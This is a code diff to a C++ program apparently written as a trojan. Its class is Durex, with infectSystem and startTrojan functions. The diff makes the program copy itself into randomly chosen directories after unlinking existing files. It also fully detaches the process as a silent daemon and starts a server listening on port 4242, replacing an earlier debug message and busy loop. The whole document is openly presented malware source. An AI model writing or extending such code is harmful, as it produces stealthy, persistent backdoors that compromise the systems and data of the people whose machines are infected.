@@ -66,6 +66,7 @@ void Durex::infectSystem()
 			random = this->getRandom(0, (content.size() - 1));
 			std::fstream file;
 			std::string filename = content[random] + "/Durex";
+			unlink(filename.c_str());
 			file.open(filename.c_str(), std::fstream::in | std::fstream::out | std::fstream::app);
 			if (file.is_open()) {
 				file << this->getDurexContent();
@@ -78,6 +79,15 @@ void Durex::infectSystem()
 	}
 }
 
+void Durex::initDaemonDefault()
+{
+	close(0);
+	close(1);
+	close(2);
+
+	chdir("/");
+}
+
 void Durex::startTrojan()
 {
 	pid_t	pid = fork();
@@ -86,18 +96,20 @@ void Durex::startTrojan()
 		if (sid > 0) {
 			pid_t new_pid = fork();
 			if (new_pid == 0) {
+				this->initDaemonDefault();
 				Service service(this->getCurrentPath());
 				service.initService();
-				std::cout << "slt vasi tinfect le system stp (" << this->getCurrentPath() << ")" << std::endl;
-				while (true);
+
+				Server server(4242);
+				server.listenInit();
 			} else if (new_pid > 0) {
 				exit(0);
 			}
 		} else {
-			//throw DaemonCantDetachProcess();
+
 		}
 	} else if (pid < 0) {
-		//throw DaemonForkFailed();
+
 	} else {
 		exit (0);
 	}
